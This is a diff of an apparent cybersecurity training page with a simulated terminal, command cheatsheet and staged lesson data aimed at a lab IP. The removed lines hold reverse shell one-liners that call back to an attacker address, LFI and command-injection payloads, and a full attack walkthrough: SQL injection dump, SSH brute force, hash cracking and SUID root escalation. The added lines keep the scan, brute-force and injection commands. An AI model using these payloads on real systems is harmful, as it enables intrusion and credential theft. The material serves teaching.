+      <div class="flex items-center gap-2 px-4 py-3 bg-[#0d121d] border-t border-[#1b2234]">
+        <span class="text-[#00F0FF] font-bold select-none shrink-0 flex items-center gap-1">
+          <span class="hidden sm:inline">cadet@calion-sandbox:~$</span>
           <span class="sm:hidden text-xs">$</span>
         </span>
         <input id="lab-terminal-input" type="text" 
-               class="flex-1 bg-transparent border-0 outline-none text-on-surface font-mono text-xs focus:ring-0 focus:outline-none"
-               placeholder="Type a Linux or security command... (or click any lesson on left)"
+               class="flex-1 bg-transparent border-0 outline-none text-white font-mono text-xs focus:ring-0 focus:outline-none placeholder-slate-600"
+               placeholder="Type a Linux or security tool command (e.g. 'help', 'nmap -sV 10.10.110.45')..."
                autocomplete="off" spellcheck="false" autofocus />
       </div>
 
-      <!-- Terminal Footer Bar -->
-      <div class="px-4 py-1.5 bg-canvas-base border-t border-border-hairline flex flex-wrap items-center justify-between gap-2 text-[10px] text-outline select-none">
-        <div class="flex items-center gap-2 sm:gap-3 flex-wrap">
-          <span class="flex items-center gap-1 text-primary">
-            <span class="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"></span>
-            <span>SANDBOX: OPERATIONAL</span>
-          </span>
-          <span class="hidden sm:inline">TARGET: 10.10.110.45</span>
-          <span class="hidden md:inline">EVAL: AUTHORIZED LAB SCOPE</span>
+      <!-- Terminal Status Bar -->
+      <div class="px-4 py-1.5 bg-[#090d14] border-t border-[#161d2d] flex flex-wrap items-center justify-between gap-2 text-[10px] text-slate-500 select-none">
+        <div class="flex items-center gap-3">
+          <span class="text-emerald-400">● SANDBOX ACTIVE</span>
+          <span>CLIENT-SIDE SANDBOX · SAFE EXECUTION ONLY</span>
         </div>
-        <div class="hidden sm:block">
-          <span>HISTORY: <kbd class="px-1 rounded bg-surface-raised border border-border-hairline">↑↓</kbd> · AUTOCOMPLETE: <kbd class="px-1 rounded bg-surface-raised border border-border-hairline">TAB</kbd></span>
+        <div class="flex items-center gap-2">
+          <span>SHORTCUTS: <kbd class="px-1 rounded bg-slate-800">TAB</kbd> AUTOCOMPLETE · <kbd class="px-1 rounded bg-slate-800">↑↓</kbd> HISTORY · <kbd class="px-1 rounded bg-slate-800">CLEAR</kbd> RESET</span>
         </div>
       </div>
 
     </div>
-
   </main>
 
-  <!-- Target Details Modal -->
-  <div id="target-modal" class="fixed inset-0 z-[120] hidden items-center justify-center p-4 bg-canvas-base/85 backdrop-blur-md">
-    <div class="w-full max-w-lg rounded-2xl bg-surface-subtle border border-secondary/40 shadow-2xl overflow-hidden font-mono text-xs">
-      <div class="px-4 py-3 bg-surface-raised border-b border-border-hairline flex items-center justify-between">
-        <div class="flex items-center gap-2 text-secondary font-bold">
-          <span class="material-symbols-outlined text-base">gps_fixed</span>
-          <span>AUTHORIZED LAB TARGET PROFILE</span>
-        </div>
-        <button id="close-target-modal-btn" class="p-1 rounded text-outline hover:text-on-surface">
-          <span class="material-symbols-outlined text-sm">close</span>
-        </button>
-      </div>
-      <div class="p-5 space-y-4">
-        <div class="space-y-1">
-          <div class="text-sm font-bold text-on-surface">Target: starlight-web.lab (10.10.110.45)</div>
-          <div class="text-secondary text-[11px]">Ubuntu Linux 22.04 LTS · Educational Scoped Target</div>
-        </div>
-        <div class="p-3 rounded-lg bg-canvas-base border border-border-hairline space-y-2">
-          <div class="text-outline text-[11px] font-bold">IDENTIFIED EXPOSURE SURFACE:</div>
-          <div class="grid grid-cols-2 gap-2 text-[11px]">
-            <div>• Port 21: vsftpd 2.3.4 (Backdoor)</div>
-            <div>• Port 22: OpenSSH 8.9p1</div>
-            <div>• Port 80: Apache 2.4.52 (/admin)</div>
-            <div>• Port 445: Samba 4.15.5</div>
-            <div>• Port 3306: MySQL 8.0</div>
-            <div>• SUID: /usr/bin/find (Root PrivEsc)</div>
-          </div>
-        </div>
-        <div class="flex justify-end pt-2">
-          <button id="run-nmap-target-btn" class="px-3.5 py-1.5 rounded bg-primary text-canvas-base font-bold text-xs hover:bg-primary-container transition-all">
-            Scan This Target Now (nmap)
-          </button>
-        </div>
-      </div>
-    </div>
-  </div>
-
   <!-- Quick Cheatsheet Modal -->
-  <div id="cheatsheet-modal" class="fixed inset-0 z-[120] hidden items-center justify-center p-4 bg-canvas-base/85 backdrop-blur-md">
+  <div id="cheatsheet-modal" class="fixed inset-0 z-50 hidden items-center justify-center p-4 bg-black/80 backdrop-blur-md">
     <div class="w-full max-w-2xl max-h-[85vh] rounded-2xl bg-surface-subtle border border-primary/40 shadow-2xl overflow-hidden font-mono text-xs flex flex-col">
       <div class="px-4 py-3 bg-surface-raised border-b border-border-hairline flex items-center justify-between">
         <div class="flex items-center gap-2 text-primary font-bold">
           <span class="material-symbols-outlined text-base">bolt</span>
-          <span>ETHICAL HACKER RAPID COMMAND CHEATSHEET</span>
+          <span>CALION RAPID COMMAND CHEATSHEET</span>
         </div>
-        <button id="close-cheatsheet-modal-btn" class="p-1 rounded text-outline hover:text-on-surface">
+        <button id="close-cheatsheet-modal-btn" class="p-1 rounded text-outline hover:text-on-surface cursor-pointer">
           <span class="material-symbols-outlined text-sm">close</span>
         </button>
       </div>
-      <div class="p-5 overflow-y-auto space-y-4">
+      <div class="p-5 overflow-y-auto space-y-4 text-on-surface">
         <div>
-          <div class="text-secondary font-bold mb-1">Nmap Scanning &amp; Service Discovery:</div>
-          <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
-            <div><code class="text-primary font-bold">nmap -sS -sV 10.10.110.45</code> - Stealth SYN scan with version detection</div>
-            <div><code class="text-primary font-bold">nmap -sC -sV 10.10.110.45</code> - Run default security discovery scripts</div>
-            <div><code class="text-primary font-bold">nmap -p- 10.10.110.45</code> - Audit all 65,535 TCP ports</div>
-            <div><code class="text-primary font-bold">nmap --script vuln 10.10.110.45</code> - Scan for known CVE vulnerabilities</div>
+          <div class="text-primary font-bold mb-1">Linux Core Commands:</div>
+          <div class="p-2.5 rounded-lg bg-surface-raised border border-border-hairline space-y-1 text-[11px]">
+            <div><code class="text-primary font-bold">whoami</code> - Print current effective user ID</div>
+            <div><code class="text-primary font-bold">lscpu</code> - Display CPU architecture and security extensions</div>
+            <div><code class="text-primary font-bold">free -h</code> - Check physical RAM and swap allocation</div>
+            <div><code class="text-primary font-bold">ls -la</code> - List directory contents with hidden files and permissions</div>
+            <div><code class="text-primary font-bold">cat /etc/passwd</code> - View system users and default login shells</div>
+            <div><code class="text-primary font-bold">chmod 700 secret.txt</code> - Set owner read/write/execute permissions</div>
           </div>
         </div>
+
         <div>
-          <div class="text-primary font-bold mb-1">Linux Navigation &amp; Privilege Escalation:</div>
-          <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
-            <div><code class="text-secondary font-bold">ls -la</code> - List all files with owner permissions &amp; hidden items</div>
-            <div><code class="text-secondary font-bold">find / -perm -4000 2>/dev/null</code> - Hunt for SUID root privilege escalation binaries</div>
-            <div><code class="text-secondary font-bold">cat /etc/passwd</code> - Audit user accounts and default login shells</div>
-            <div><code class="text-secondary font-bold">sudo -l</code> - Inspect commands allowed to execute as root without password</div>
+          <div class="text-secondary font-bold mb-1">Networking &amp; Recon:</div>
+          <div class="p-2.5 rounded-lg bg-surface-raised border border-border-hairline space-y-1 text-[11px]">
+            <div><code class="text-secondary font-bold">ip a / ifconfig</code> - Inspect network interfaces and IP addresses</div>
+            <div><code class="text-secondary font-bold">nmap -sS -sV 10.10.110.45</code> - Stealth SYN port scan with banner grabbing</div>
+            <div><code class="text-secondary font-bold">nmap --script vuln 10.10.110.45</code> - Audit open ports against vulnerability CVEs</div>
+            <div><code class="text-secondary font-bold">curl -I http://10.10.110.45</code> - Fetch HTTP response headers</div>
+            <div><code class="text-secondary font-bold">gobuster dir -u http://10.10.110.45 -w wordlist.txt</code> - Brute-force web directories</div>
           </div>
         </div>
+
         <div>
-          <div class="text-warning font-bold mb-1">Web Recon &amp; Password Cracking:</div>
-          <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
-            <div><code class="text-warning font-bold">gobuster dir -u http://10.10.110.45 -w wordlist.txt</code> - Directory brute-forcing</div>
-            <div><code class="text-warning font-bold">hydra -l admin -P wordlist.txt ssh://10.10.110.45</code> - Network service login cracking</div>
-            <div><code class="text-warning font-bold">hashcat -m 0 hashes.txt rockyou.txt</code> - GPU accelerated MD5 hash cracking</div>
-            <div><code class="text-warning font-bold">sqlmap -u "http://10.10.110.45/product.php?id=1" --dbs</code> - Automated SQL injection testing</div>
-          </div>
-        </div>
-        <div>
-          <div class="text-danger-critical font-bold mb-1 flex items-center justify-between">
-            <span>RCE, LFI &amp; Reverse Shell Payloads:</span>
-            <a href="handbook/index.html" class="text-primary hover:underline text-[10px] flex items-center gap-1 font-bold">
-              <span>Full Command Handbook ↗</span>
-            </a>
-          </div>
-          <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-[11px]">
-            <div><code class="text-danger-critical font-bold">bash -i &gt;&amp; /dev/tcp/10.10.14.23/4444 0&gt;&amp;1</code> - Bash TCP Shell</div>
-            <div><code class="text-danger-critical font-bold">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [IP] [PORT] &gt;/tmp/f</code> - Netcat FIFO</div>
-            <div><code class="text-danger-critical font-bold">php://filter/convert.base64-encode/resource=index.php</code> - LFI Source Leak</div>
-            <div><code class="text-danger-critical font-bold">cat${IFS}/etc/passwd</code> - CMDi Space Filter Bypass</div>
+          <div class="text-amber-500 font-bold mb-1">Security &amp; Pentesting Utilities:</div>
+          <div class="p-2.5 rounded-lg bg-surface-raised border border-border-hairline space-y-1 text-[11px]">
+            <div><code class="text-amber-500 font-bold">hydra -l admin -P wordlist.txt ssh://10.10.110.45</code> - Audit authentication</div>
+            <div><code class="text-amber-500 font-bold">sqlmap -u "http://10.10.110.45/product.php?id=1" --dbs</code> - Automated SQL injection</div>
+            <div><code class="text-amber-500 font-bold">find / -perm -u=s -type f 2&gt;/dev/null</code> - Locate SUID root binaries</div>
           </div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- Global Footer -->
-  <footer class="border-t border-border-hairline bg-surface-subtle py-8 text-center font-mono text-xs text-on-surface-variant mt-16">
-    <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4">
-      <div class="flex items-center gap-2">
-        <span class="w-2 h-2 rounded-full bg-primary"></span>
-        <span class="text-on-surface font-bold">CALION Academy</span>
-        <span>· Free &amp; Open Cybersecurity Training</span>
-      </div>
-      <div class="flex items-center gap-4 text-outline">
-        <a href="index.html" class="hover:text-primary transition-colors">Portfolio</a>
-        <a href="learning.html" class="hover:text-primary transition-colors">Learning</a>
-        <a href="labs.html" class="hover:text-primary transition-colors">Labs</a>
-        <a href="terminal-lab.html" class="text-primary font-bold">Terminal</a>
-        <a href="glossary.html" class="hover:text-primary transition-colors">Glossary</a>
-      </div>
-    </div>
-  </footer>
-
-  <!-- Include Interactive System & Lab Script -->
-  <script src="portfolio-interactive.js"></script>
-  <script>
-    // =========================================================================
-    // STRUCTURED ROADMAP & CURATED PRACTICAL LESSONS DATASET
-    // =========================================================================
-    const LESSONS = {
-      roadmap: {
-        title: "6-Stage Ethical Hacker Methodology Roadmap",
-        description: "Follow the structured step-by-step engagement workflow: from initial host reconnaissance and port auditing, to vulnerability discovery, web fuzzing, password attacks, and privilege escalation.",
-        cards: [
-          {
-            stage: "01",
-            stageName: "Host Recon",
-            title: "Stage 01: Host Discovery & Environment Inspection",
-            command: "cat /etc/passwd",
-            flags: ["cat: Display file content", "/etc/passwd: System user database"],
-            desc: "Begin by understanding the operating environment. Inspect local user accounts, identify interactive bash shells, and search for non-privileged accounts.",
-            expectedOutput: `root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-mihraj:x:1000:1000:Mihraj Mashhoor K,,,:/home/mihraj:/bin/bash
-guest:x:1001:1001:Lab Guest Practitioner,,,:/home/guest:/bin/bash
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false`,
-            analysis: "User baseline established. Identified user 'guest' and service account 'www-data' (web server). Next, inspect scoped network targets in targets.txt."
-          },
-          {
-            stage: "02",
-            stageName: "Nmap Ports",
-            title: "Stage 02: Network Scoping & Service Interrogation",
-            command: "nmap -sS -sV 10.10.110.45",
-            flags: ["-sS: TCP SYN Stealth Scan", "-sV: Probe open ports for service version"],
-            desc: "Probe target 10.10.110.45 to identify open network ports and fingerprint running service banners.",
-            expectedOutput: `PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 2.3.4
-22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
-80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
-445/tcp  open  netbios-ssn Samba smbd 4.15.5
-3306/tcp open  mysql       MySQL 8.0.35`,
-            analysis: "Surface discovery confirmed 5 exposed ports. Port 21 (vsftpd 2.3.4) and Port 80 (Apache 2.4.52) represent primary attack vectors."
-          },
-          {
-            stage: "03",
-            stageName: "Vuln Scan",
-            title: "Stage 03: Vulnerability & Exploit Assessment",
-            command: "nmap --script vuln 10.10.110.45",
-            flags: ["--script vuln: Execute CVE vulnerability audit scripts"],
-            desc: "Run Nmap's vulnerability detection scripts against detected services to detect public CVEs and backdoor configurations.",
-            expectedOutput: `PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 2.3.4
-| ftp-vsftpd-backdoor: 
-|   VULNERABLE: vsftpd version 2.3.4 backdoor
-|   State: VULNERABLE (Exploitable)
-|   IDs:  CVE:CVE-2011-2523  OSVDB:73573
-|_  Description: vsftpd 2.3.4 contains a backdoor smiley triggering shell on port 6200.`,
-            analysis: "CRITICAL FINDING: Port 21 is confirmed vulnerable to CVE-2011-2523. Next, audit web endpoints on port 80 using Gobuster."
-          },
-          {
-            stage: "04",
-            stageName: "Web & SQLi",
-            title: "Stage 04: Web Directory Fuzzing & SQL Injection",
-            command: "gobuster dir -u http://10.10.110.45 -w wordlist.txt",
-            flags: ["dir: Directory brute-force mode", "-u: Target URL", "-w: Wordlist path"],
-            desc: "Brute-force hidden HTTP directories on the web server to locate administrative panels, upload endpoints, and API gateways.",
-            expectedOutput: `[+] /admin               (Status: 301) [Size: 178] [--> http://10.10.110.45/admin/]
-[+] /login               (Status: 200) [Size: 2450]
-[+] /uploads             (Status: 200) [Size: 412] [Directory Index]
-[+] /api                 (Status: 403) [Size: 280]`,
-            analysis: "Discovered unlinked portals /admin and /uploads. You can now test database injection via: sqlmap -u 'http://10.10.110.45/product.php?id=1' --dbs."
-          },
-          {
-            stage: "05",
-            stageName: "Passwords",
-            title: "Stage 05: Authentication Auditing & Hash Cracking",
-            command: "hydra -l admin -P wordlist.txt ssh://10.10.110.45",
-            flags: ["-l admin: Targeted user", "-P: Wordlist", "ssh://: Service URI"],
-            desc: "Perform a dictionary attack against SSH using discovered usernames and standard passwords to gain initial administrative access.",
-            expectedOutput: `[DATA] attacking ssh://10.10.110.45:22/
-[ATTEMPT] testing admin : password ... [failed]
-[ATTEMPT] testing admin : 123456 ... [failed]
-[22][ssh] host: 10.10.110.45   login: admin   password: Password123
-1 of 1 target completed, 1 valid password found!`,
-            analysis: "Credentials compromised: admin:Password123. SSH shell gained. You can also crack database MD5 hashes using: hashcat -m 0 hashes.txt rockyou.txt."
-          },
-          {
-            stage: "06",
-            stageName: "Root Shell",
-            title: "Stage 06: Privilege Escalation & Root Acquisition",
-            command: "find . -exec /bin/sh -p \\; -quit",
-            flags: ["-exec: Command execution flag", "/bin/sh -p: Preserve SUID root EUID", "-quit: Exit after 1st execution"],
-            desc: "Exploit misconfigured SUID permissions on /usr/bin/find to elevate from standard user to EUID=0 (root) command shell.",
-            expectedOutput: `# ROOT SHELL SPAWNED (EUID=0)
-root@sec-station:~# whoami
-root (uid=0 gid=0 groups=0(root))`,
-            analysis: "MISSION COMPLETE: Elevated to root (uid=0). SUID abuse successfully bypassed privilege boundaries. Full lab engagement completed!"
-          }
-        ]
-      },
-      linux: {
-        title: "Linux System & Core Inspection",
-        description: "Master essential Linux navigation, permission analysis, process inspection, and grep pipeline filters.",
-        cards: [
-          {
-            title: "List Directory with Full Permissions",
-            command: "ls -la",
-            flags: ["-l: Long listing format", "-a: Show hidden files (.dotfiles)"],
-            desc: "Displays file permissions (rwx), owners, file sizes, and timestamps to inspect local files in the target directory.",
-            expectedOutput: `total 40
-drwxr-xr-x 2 guest guest  4096 Oct 04 00:15 .
-drwxr-xr-x 4 guest guest  4096 Oct 04 00:01 ..
--rwxr-xr-x 1 guest guest   412 Oct 04 00:12 recon.sh
--rw-r--r-- 1 guest guest   284 Oct 04 00:10 targets.txt
--rw-r--r-- 1 guest guest   390 Oct 04 00:14 notes.txt
--rw------- 1 guest guest  1823 Oct 04 00:08 id_rsa
--rw-r--r-- 1 guest guest   195 Oct 04 00:09 hashes.txt
--rw-r--r-- 1 guest guest    98 Oct 04 00:05 wordlist.txt`,
-            analysis: "Identified engagement notes, targets list, wordlist, and private SSH key (id_rsa with restrictive 600 permissions)."
-          },
-          {
-            title: "Inspect System User Accounts",
-            command: "cat /etc/passwd",
-            flags: ["cat: Read file content", "/etc/passwd: System user database"],
-            desc: "Audits all accounts registered on the system. Useful for identifying non-standard users and login shells (e.g. /bin/bash vs /nologin).",
-            expectedOutput: `root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-mihraj:x:1000:1000:Mihraj Mashhoor K,,,:/home/mihraj:/bin/bash
-guest:x:1001:1001:Lab Guest Practitioner,,,:/home/guest:/bin/bash
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
-            analysis: "Verified accounts: root (uid 0), mihraj (uid 1000), guest (uid 1001). Service accounts like www-data do not have login shells."
-          },
-          {
-            title: "Hunt for SUID Privilege Escalation Binaries",
-            command: "find / -perm -4000 2>/dev/null",
-            flags: ["-perm -4000: Match SUID bit", "2>/dev/null: Discard errors"],
-            desc: "Scans the entire filesystem for binaries that execute with root privileges. Misconfigured SUID binaries like 'find' can lead to instant root access.",
-            expectedOutput: `/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/find  <-- [POTENTIAL MISCONFIGURATION: SUID bit enabled!]
-/bin/ping`,
-            analysis: "Critical finding: /usr/bin/find has the SUID bit set. This allows executing /bin/sh with root EUID."
-          },
-          {
-            title: "Check Sudo Privileges Without Password",
-            command: "sudo -l",
-            flags: ["-l: List privileges", "sudo: Superuser execution"],
-            desc: "Queries the sudoers file to identify which binaries the current user can execute as root without requiring a password.",
-            expectedOutput: `User guest may run the following commands on sec-station:
-    (ALL : ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/python3, /usr/bin/find`,
-            analysis: "User 'guest' has NOPASSWD access to /usr/bin/nmap, /usr/bin/python3, and /usr/bin/find. Any of these can yield an instant root shell."
-          }
-        ]
-      },
-      nmap: {
-        title: "Nmap Network Discovery & Auditing",
-        description: "Learn how to probe network boundaries, discover open ports, fingerprint service versions, and identify vulnerabilities.",
-        cards: [
-          {
-            title: "Fast Stealth SYN & Service Version Scan",
-            command: "nmap -sS -sV 10.10.110.45",
-            flags: ["-sS: TCP SYN Stealth (half-open)", "-sV: Service version detection"],
-            desc: "The gold standard initial scan. Sends TCP SYN packets without completing the 3-way handshake, followed by version interrogation.",
-            expectedOutput: `PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 2.3.4
-22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu
-80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
-445/tcp  open  netbios-ssn Samba smbd 4.15.5
-3306/tcp open  mysql       MySQL 8.0.35`,
-            analysis: "Ports 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB), and 3306 (MySQL) are active. vsftpd 2.3.4 contains a backdoor smiley."
-          },
-          {
-            title: "Version Probes with Safe Default NSE Scripts",
-            command: "nmap -sC -sV 10.10.110.45",
-            flags: ["-sC: Execute default safe NSE scripts", "-sV: Service version detection"],
-            desc: "Runs Nmap's default scripts to detect anonymous FTP access, web titles, SSL certificates, and NetBIOS workgroup names.",
-            expectedOutput: `PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 2.3.4
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-80/tcp   open  http    Apache httpd 2.4.52
-|_http-title: Starlight Portal - Authorized Login Only`,
-            analysis: "Anonymous FTP login allowed on port 21 without a password. Web portal title confirms internal application."
-          },
-          {
-            title: "Automated Known Vulnerability Scan",
-            command: "nmap --script vuln 10.10.110.45",
-            flags: ["--script vuln: Execute CVE vulnerability detection scripts"],
-            desc: "Runs vulnerability audit scripts against detected services to check for known public exploits and configuration flaws.",
-            expectedOutput: `PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 2.3.4
-| ftp-vsftpd-backdoor: 
-|   VULNERABLE: vsftpd version 2.3.4 backdoor
-|   State: VULNERABLE (Exploitable)
-|   IDs:  CVE:CVE-2011-2523`,
-            analysis: "Confirmed CVE-2011-2523 vsftpd backdoor vulnerability on port 21."
-          }
-        ]
-      },
-      web: {
-        title: "Web Reconnaissance & Endpoint Fuzzing",
-        description: "Enumerate hidden directories, administrative portals, and API endpoints using modern fuzzing tools.",
-        cards: [
-          {
-            title: "Directory Brute-Forcing with Gobuster",
-            command: "gobuster dir -u http://10.10.110.45 -w wordlist.txt",
-            flags: ["dir: Directory mode", "-u: Target URL", "-w: Wordlist path"],
-            desc: "Sends rapid HTTP requests matching words in wordlist.txt to uncover unlinked directories like /admin, /login, /uploads, and /api.",
-            expectedOutput: `[+] /admin               (Status: 301) [Size: 178]
-[+] /login               (Status: 200) [Size: 2450]
-[+] /uploads             (Status: 200) [Size: 412]
-[+] /api                 (Status: 403) [Size: 280]`,
-            analysis: "Discovered unlinked /admin portal and /uploads folder."
-          },
-          {
-            title: "Automated SQL Injection Detection (SQLMap)",
-            command: "sqlmap -u \"http://10.10.110.45/product.php?id=1\" --dbs",
-            flags: ["-u: Target endpoint with parameter", "--dbs: Enumerate DBMS databases"],
-            desc: "Tests the 'id' parameter for Boolean, Error, UNION, and Time-based SQL injections, then retrieves the backend database names.",
-            expectedOutput: `sqlmap identified the following injection points:
-• Type: boolean-based blind / UNION query (3 columns)
-Available Databases:
-[*] information_schema
-[*] starlight_portal
-[*] users_production`,
-            analysis: "Vulnerable to SQLi. Backend database 'users_production' contains authentication tables."
-          },
-          {
-            title: "Dump Database Table Records with SQLMap",
-            command: "sqlmap -u \"http://10.10.110.45/product.php?id=1\" -D users_production -T accounts --dump",
-            flags: ["-D: Database name", "-T: Table name", "--dump: Extract all rows"],
-            desc: "Extracts user credentials, password hashes, and email records from the compromised database table.",
-            expectedOutput: `+----+----------+----------------------------------+---------------------+
-| id | username | password_hash                    | email               |
-+----+----------+----------------------------------+---------------------+
-| 1  | admin    | e10adc3949ba59abbe56e057f20f883e | admin@starlight.lab |
-| 2  | analyst  | 098f6bcd4621d373cade4e832627b4f6 | sec@starlight.lab   |
-+----+----------+----------------------------------+---------------------+`,
-            analysis: "Extracted password hashes for 'admin' and 'analyst'. Hashes can now be cracked with Hashcat."
-          }
-        ]
-      },
-      passwords: {
-        title: "Authentication & Password Auditing",
-        description: "Test password strength, execute controlled dictionary attacks, and crack cryptographic hashes.",
-        cards: [
-          {
-            title: "SSH Credential Brute-Force with Hydra",
-            command: "hydra -l admin -P wordlist.txt ssh://10.10.110.45",
-            flags: ["-l: Single target username", "-P: Wordlist of passwords", "ssh://: Protocol & target IP"],
-            desc: "Tests dictionary passwords against the target's SSH service until valid credentials (admin:Password123) are identified.",
-            expectedOutput: `[DATA] attacking ssh://10.10.110.45:22/
-[22][ssh] host: 10.10.110.45   login: admin   password: Password123
-1 of 1 target completed, 1 valid password found!`,
-            analysis: "Valid SSH credentials recovered: admin:Password123."
-          },
-          {
-            title: "GPU Accelerated MD5 Hash Cracking with Hashcat",
-            command: "hashcat -m 0 hashes.txt rockyou.txt",
-            flags: ["-m 0: MD5 hash mode", "hashes.txt: Hash list", "rockyou.txt: Dictionary file"],
-            desc: "Leverages compute cores to crack MD5 password hashes against standard security wordlists.",
-            expectedOutput: `e10adc3949ba59abbe56e057f20f883e:123456
-098f6bcd4621d373cade4e832627b4f6:test
-Status...........: Cracked (100.00%)`,
-            analysis: "Hashes cracked: admin password is '123456', analyst password is 'test'."
-          }
-        ]
-      },
-      privesc: {
-        title: "Privilege Escalation Techniques",
-        description: "Identify privilege boundary weaknesses, misconfigured binaries, and sudo bypasses.",
-        cards: [
-          {
-            title: "SUID Binary Root Shell via Find",
-            command: "find . -exec /bin/sh -p \\; -quit",
-            flags: ["-exec: Run command on match", "/bin/sh -p: Preserve root SUID privileges", "-quit: Exit after 1st execution"],
-            desc: "When /usr/bin/find has the SUID bit set, executing /bin/sh -p through -exec spawns a shell retaining EUID=0 (root).",
-            expectedOutput: `# ROOT SHELL SPAWNED (EUID=0)
-root@sec-station:~# whoami
-root (uid=0 gid=0 groups=0(root))`,
-            analysis: "Root shell achieved. Privilege escalation successful via SUID find binary."
-          },
-          {
-            title: "Check Sudoers Rules for Passwordless Commands",
-            command: "sudo -l",
-            flags: ["sudo -l: List permitted commands"],
-            desc: "Checks which binaries can be executed with elevated privileges without providing a password.",
-            expectedOutput: `User guest may run the following commands on sec-station:
-    (ALL : ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/python3, /usr/bin/find`,
-            analysis: "NOPASSWD sudo access available for /usr/bin/nmap, /usr/bin/python3, and /usr/bin/find."
-          }
-        ]
-      },
-      metasploit: {
-        title: "Metasploit Framework & Reverse Shells",
-        description: "Learn modular vulnerability verification, payload configuration, and remote command listeners.",
-        cards: [
-          {
-            title: "Search Exploit-DB for Known Vulnerabilities",
-            command: "searchsploit vsftpd 2.3.4",
-            flags: ["searchsploit: Offline Exploit-DB search utility"],
-            desc: "Queries local Exploit-DB archive for public exploit scripts matching the detected service version.",
-            expectedOutput: `Exploit Title                                     |  Path
----------------------------------------------------+---------------------------------
- vsftpd 2.3.4 - Backdoor Command Execution         | unix/remote/49757.py
- vsftpd 2.3.4 - Backdoor Command Execution (MSF)   | unix/remote/17491.rb`,
-            analysis: "Public exploit available in Exploit-DB: unix/remote/49757.py."
-          },
-          {
-            title: "Start Netcat Reverse Shell Listener",
-            command: "nc -lvnp 4444",
-            flags: ["-l: Listen mode", "-v: Verbose output", "-n: Numeric IP only", "-p: Target listening port"],
-            desc: "Opens a TCP listening port on your security station to catch incoming reverse shells spawned from target payloads.",
-            expectedOutput: `listening on [any] 4444 ...
-connect to [10.10.14.23] from (UNKNOWN) [10.10.110.45] 52410
-www-data@starlight-web:/var/www/html$ whoami
-www-data`,
-            analysis: "Reverse shell caught. Initial web server command execution established."
-          }
-        ]
-      }
-    };
-
-    // =========================================================================
-    // ROADMAP PROGRESS TRACKING LOGIC
-    // =========================================================================
-    const completedStages = new Set(['1']);
-    const progressBar = document.getElementById('roadmap-progress-bar');
-    const progressLabel = document.getElementById('roadmap-progress-label');
-    const stagePills = document.querySelectorAll('.stage-pill');
-
-    function updateRoadmapProgress() {
-      const total = 6;
-      const done = completedStages.size;
-      const pct = Math.min(100, Math.round((done / total) * 100));
-      progressBar.style.width = pct + '%';
-      progressLabel.innerText = `${done} / ${total} Completed (${pct}%)`;
-
-      stagePills.forEach(pill => {
-        const s = pill.getAttribute('data-stage');
-        if (completedStages.has(s)) {
-          pill.classList.add('border-primary', 'bg-primary/20', 'text-primary');
-          if (!pill.querySelector('.check-icon')) {
-            const check = document.createElement('span');
-            check.className = 'material-symbols-outlined text-[12px] check-icon text-primary font-bold';
-            check.innerText = 'check';
-            pill.prepend(check);
-          }
-        }
-      });
-    }
-
-    stagePills.forEach(pill => {
-      pill.addEventListener('click', () => {
-        const stageNum = pill.getAttribute('data-stage');
-        renderTrack('roadmap');
-        setTimeout(() => {
-          const targetCard = document.querySelector(`[data-stage-card="${stageNum}"]`);
-          if (targetCard) targetCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 50);
-      });
-    });
-
-    // =========================================================================
-    // DYNAMIC LESSON RENDERING WITH EXPECTED OUTPUT PREVIEW
-    // =========================================================================
-    const cardsContainer = document.getElementById('module-cards-container');
-    const trackTabs = document.querySelectorAll('.track-tab-btn');
-
-    function renderTrack(trackKey) {
-      const data = LESSONS[trackKey] || LESSONS.roadmap;
-      
-      let html = `
-        <div class="p-3.5 rounded-xl bg-canvas-base border border-border-hairline space-y-1">
-          <div class="text-primary font-bold text-xs flex items-center justify-between">
-            <span class="flex items-center gap-1.5">
-              <span class="material-symbols-outlined text-sm">auto_stories</span>
-              <span>${data.title}</span>
-            </span>
-            ${trackKey === 'roadmap' ? '<span class="px-2 py-0.5 rounded bg-primary/20 text-primary text-[10px] font-bold">GUIDED LAB</span>' : ''}
-          </div>
-          <div class="text-[11px] text-outline leading-relaxed">${data.description}</div>
-        </div>
-      `;
-
-      data.cards.forEach((card, idx) => {
-        const stageBadge = card.stage ? `
-          <span class="px-2 py-0.5 rounded bg-primary/10 border border-primary/30 text-primary font-mono text-[10px] font-bold">
-            STAGE ${card.stage}: ${card.stageName}
-          </span>
-        ` : '';
-
-        html += `
-          <div class="p-3.5 rounded-xl bg-surface-subtle border border-border-hairline hover:border-primary/40 transition-all space-y-2.5 group" ${card.stage ? `data-stage-card="${escapeHtml(card.stage)}"` : ''}>
-            <div class="flex items-center justify-between gap-2 flex-wrap">
-              <div class="flex items-center gap-2">
-                ${stageBadge}
